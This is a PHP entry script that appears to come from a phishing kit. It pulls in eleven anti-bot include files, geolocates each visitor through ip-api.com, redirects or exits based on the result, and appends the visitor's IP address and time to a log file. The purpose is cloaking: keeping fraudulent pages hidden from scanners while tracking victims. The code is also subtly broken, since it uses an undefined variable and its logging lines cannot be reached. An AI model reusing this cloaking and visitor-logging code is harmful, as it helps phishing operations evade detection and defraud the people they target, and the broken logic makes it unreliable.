<?php
	
	// ─── ❝ ✎ 𝙕𝙊𝙍𝙊™ ッ ❞ ──── //

		session_start(); 
		error_reporting(0);
			
			include "./M3tri-hash-bots/anti0.php";
			include "./M3tri-hash-bots/anti1.php";
			include "./M3tri-hash-bots/anti2.php";
			include "./M3tri-hash-bots/anti3.php";
			include "./M3tri-hash-bots/anti4.php";
			include "./M3tri-hash-bots/anti5.php";
			include "./M3tri-hash-bots/anti6.php";
			include "./M3tri-hash-bots/anti7.php";
			include "./M3tri-hash-bots/anti8.php";
			include "./M3tri-hash-bots/anti9.php";
			include "./M3tri-hash-bots/index.php";

				
		$country = file_get_contents('http://ip-api.com/json/'.$ip);
		$result = json_decode($country, true);
		
	if ($result['countryCode'] == '') {header('Location: home.php');}
		else {exit();}

$handle = fopen("visite.html", "a+");
fwrite($handle,"IP: ".getenv("REMOTE_ADDR")." TIME: ".date("Y-m-d H:i:s")." <br>");
fclose($handle);

?>